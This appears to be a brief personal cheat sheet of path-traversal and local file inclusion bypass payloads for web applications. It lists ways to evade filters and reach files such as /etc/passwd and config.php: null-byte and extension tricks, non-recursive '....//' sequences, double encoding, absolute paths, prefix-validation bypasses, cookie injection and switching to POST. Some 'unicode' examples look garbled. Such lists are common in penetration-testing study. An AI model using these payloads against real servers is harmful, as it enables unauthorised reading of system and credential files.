-> May be server is blocking `.` we can use UNICODE ENCODING likr Download.php?file=⊙/config.php or Download.php?file=⊙.config.php Download.php?file=⊡⊙/config.php.
-> NULL BYTE BYPASS ALSO like -> %00./config.php


Tip-> sometime server block traversal sequences like `../../` but if we give direct value like `?filename=/etc/passwd bypass

Tip -> Traversal sequence stripped non-recursively -> `....//....//....//`

Tip -> Double encode / tripe encode url

Tip -> Maybe sometimes server validate only start of path like `/var/www/images` this parts -> `/var/www/images/../../../../`

Tip -> /image?filename=../../../../../../etc/passwd%00.jpg -> when server validate by image jpg file extension

-> check for LFI in cookies

-> sometimes get method chceks for validation we can bypass by using POST method


